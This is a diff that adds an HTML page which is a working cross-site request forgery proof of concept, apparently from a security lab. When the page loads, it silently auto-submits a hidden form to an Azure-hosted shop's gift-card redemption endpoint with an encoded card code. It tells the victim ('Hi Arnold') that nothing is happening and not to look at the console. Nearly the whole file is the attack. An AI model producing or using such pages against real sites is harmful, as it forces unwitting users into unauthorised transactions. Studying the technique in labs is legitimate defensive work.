@@ -1,0 +1,31 @@
+<html>
+  <head>
+    <script type="text/javascript" src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.js"></script>
+  </head>
+  <body>
+    Hi Arnold.
+    <br />
+    don't worry. Nothing is happening. Don't look at the console.
+    <br />
+    <br />
+    <span>CSRF Status: </span><span id="status"></span>
+    <br />
+    <br />
+    <br />
+    <form action="http://shred-95952-25vt7gvfwbimahhb.northcentralus.cloudapp.azure.com/Skate/redeemGiftCard.action" method="POST">
+      <input type="hidden" name="code" value="eyJpZCI6MTAzfQ==" />
+    </form>
+  </body>
+
+  <script>
+    $("#status").text("Loading");
+
+    $(document).ready(async function() {
+      $("#status").text("CSRF redeeming evil gift card...");
+
+      document.forms[0].submit();
+
+      $("#status").text("CSRF done! You've just redeemed a negative balance gift card on Skate!");
+    });
+  </script>
+</html>
